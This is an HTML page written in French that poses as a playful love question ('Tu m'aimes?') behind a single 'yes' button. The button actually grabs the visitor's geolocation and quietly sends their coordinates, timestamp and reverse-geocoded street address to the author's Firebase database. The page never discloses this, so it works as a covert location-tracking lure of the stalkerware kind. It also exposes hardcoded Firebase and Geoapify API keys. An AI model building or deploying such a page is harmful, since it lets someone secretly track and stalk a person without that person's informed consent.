<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Mon bébé??😊</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>
body {
  margin:0;
  background:#0f172a;
  color:white;
  font-family:Arial;
  text-align:center;
}
button {
  margin:15px;
  padding:14px;
  font-size:18px;
  border:none;
  border-radius:10px;
  background:#3b82f6;
  color:white;
}
#map { height:65vh; }
</style>
</head>

<body>

<h2>Tu m'aimes❤️😊??</h2>
<button onclick="start()">OUIIII!!❤️</button>

<p id="status">Réponds oui stp..</p>
<p id="coords"></p>
<p id="address"></p>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

<script>

// 🔥 CONFIG FIREBASE (la tienne)
firebase.initializeApp({
  apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
  authDomain: "mymaponline-d4fcf.firebaseapp.com",
  projectId: "mymaponline-d4fcf",
  storageBucket: "mymaponline-d4fcf.appspot.com",
  messagingSenderId: "294259967332",
  appId: "1:294259967332:web:d81f81f5122ff5ef626671"
});

const db = firebase.firestore();

let map, marker;
let loading = false; // anti spam

function start() {

  if (loading) return; // 🔥 empêche spam
  loading = true;

  const status = document.getElementById("status");
  status.innerText = "⏳ Recherche...";

  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: false,   // ⚡ rapide
    maximumAge: 60000,           // ⚡ cache = instant
    timeout: 10000               // ⏱️ laisse le temps
  });

}

function onSuccess(pos) {

  loading = false;

  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;

  document.getElementById("status").innerText = "✅ OK";
  document.getElementById("coords").innerText = lat + " , " + lon;

  // 🗺️ MAP
  if (!map) {
    map = L.map('map').setView([lat, lon], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
      .addTo(map);

    marker = L.marker([lat, lon]).addTo(map);
  } else {
    map.setView([lat, lon]);
    marker.setLatLng([lat, lon]);
  }

  // 🔥 FIREBASE DIRECT
  db.collection("positions").add({
    lat: lat,
    lon: lon,
    time: new Date().toISOString()
  });

  // 🌍 GEOAPIFY (async)
  fetch(`https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`)
    .then(r => r.json())
    .then(d => {
      const addr = d.features?.[0]?.properties?.formatted || "Adresse inconnue";
      document.getElementById("address").innerText = addr;

      // update log avec adresse
      db.collection("positions").add({
        lat: lat,
        lon: lon,
        address: addr,
        time: new Date().toISOString()
      });
    });

}

function onError(err) {

  loading = false;

  const status = document.getElementById("status");

  if (err.code === 1) {
    status.innerText = "❌ Autorisation refusée";
  } else if (err.code === 2) {
    status.innerText = "❌ Position indisponible";
  } else if (err.code === 3) {
    status.innerText = "❌ Timeout GPS";
  } else {
    status.innerText = "❌ Erreur";
  }

  console.log(err);
}

</script>

</body>
</html>
